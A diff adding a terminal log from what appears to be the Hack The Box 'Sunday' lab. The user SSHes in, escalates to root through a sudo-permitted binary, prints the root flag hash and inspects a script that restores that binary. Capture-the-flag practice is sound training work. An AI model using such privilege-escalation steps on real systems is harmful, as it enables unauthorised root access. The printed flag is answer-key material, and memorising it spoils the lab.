@@ -1,0 +1,51 @@
+┌─[root@parrot]─[~/hackthebox/sunday]   
+└──╼ #ssh -okexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
+Password:           
+Last login: Tue Dec 31 10:44:39 2019 from 10.10.14.14                           
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008           
+sunny@sunday:~$ sudo /root/troll                                                
+root@sunday:~# ls   
+Desktop  Documents  Downloads  local.cshrc  local.login  local.profile  Public  
+root@sunday:~# cd Desktop               
+root@sunday:~/Desktop# ls               
+addmoresoftware.desktop         register-opensolaris.desktop                    
+opensolaris-next-steps.desktop          
+root@sunday:~/Desktop# cd ..            
+root@sunday:~# cat root.txt             
+cat: root.txt: No such file or directory                                        
+root@sunday:~# ls   
+Desktop  Documents  Downloads  local.cshrc  local.login  local.profile  Public  
+root@sunday:~# cd /root                 
+root@sunday:/root# ls                   
+overwrite  root.txt  troll  troll.original                                      
+root@sunday:/root# cat root.txt         
+fb40fab61d99d37536daeec0d97af9b8        
+root@sunday:/root# date                 
+Tue Dec 31 14:10:57 IST 2019            
+root@sunday:/root# date                 
+Tue Dec 31 14:11:07 IST 2019            
+root@sunday:/root# ls                                                           
+overwrite  root.txt  troll  troll.original                                      
+root@sunday:/root# cat overwrite        
+#!/usr/bin/bash     
+
+while true; do      
+        /usr/gnu/bin/cat /root/troll.original > /root/troll                     
+        /usr/gnu/bin/sleep 5            
+done                
+root@sunday:/root# ls -la               
+total 18            
+drwx------  6 root root   13 2018-04-24 10:31 .                                 
+drwxr-xr-x 26 root root   27 2018-04-24 12:57 ..                                
+-rw-r--r--  1 root root  280 2009-05-14 21:18 .bashrc                           
+drwx------  3 root root    3 2018-04-15 20:22 .config                           
+drwx------  3 root root    3 2019-12-31 12:30 .gconf                            
+drwx------  2 root root    3 2018-04-15 20:23 .gconfd                           
+-rwx------  1 root root  112 2018-04-24 10:48 overwrite                         
+-rw-r--r--  1 root root  611 2009-05-14 21:18 .profile                          
+-rw-------  1 root root 1365 2018-04-15 20:23 .recently-used.xbel               
+-r--------  1 root root   33 2018-04-15 20:38 root.txt                          
+drwx------  3 root root    3 2018-04-15 20:30 .sunw                             
+-r-x--x--x  1 root root   53 2019-12-31 14:29 troll                             
+-rw-------  1 root root   53 2018-04-24 10:35 troll.original                    
+root@sunday:/root#  
